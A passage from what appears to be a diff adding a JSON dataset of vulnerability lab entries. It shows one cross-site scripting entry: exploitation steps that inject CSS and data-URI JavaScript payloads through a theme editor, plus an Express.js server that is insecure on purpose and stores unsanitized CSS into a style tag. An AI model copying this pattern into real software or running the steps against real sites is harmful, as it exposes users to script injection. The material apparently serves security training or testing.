+            "Submit a theme update via the theme editor with a payload in the CSS, e.g., body {background: url('x');} and append a malicious attribute using a data URI with JavaScript.",
+            "Use Burp Suite to modify the theme submission request if needed.",
+            "Reload the page and observe the theme being applied unsafely.",
+            "Craft an alternative payload using a mutation event, e.g., a payload that leverages expression() in older browsers or a data URI.",
+            "Confirm that the payload results in script execution upon theme load."
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet themeCSS = 'body { background: #fff; }';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/theme', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <style>${themeCSS}</style>\n      </head>\n      <body>\n        <h2>Dynamic Theme Editor</h2>\n        <form action='/theme-update' method='POST'>\n          <textarea name='css' placeholder='Enter custom CSS'></textarea>\n          <button type='submit'>Update Theme</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/theme-update', (req, res) => {\n  // Vulnerable: saving unsanitized CSS input directly\n  themeCSS = req.body.css;\n  res.redirect('/theme');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
+        } 
+  ]
+  
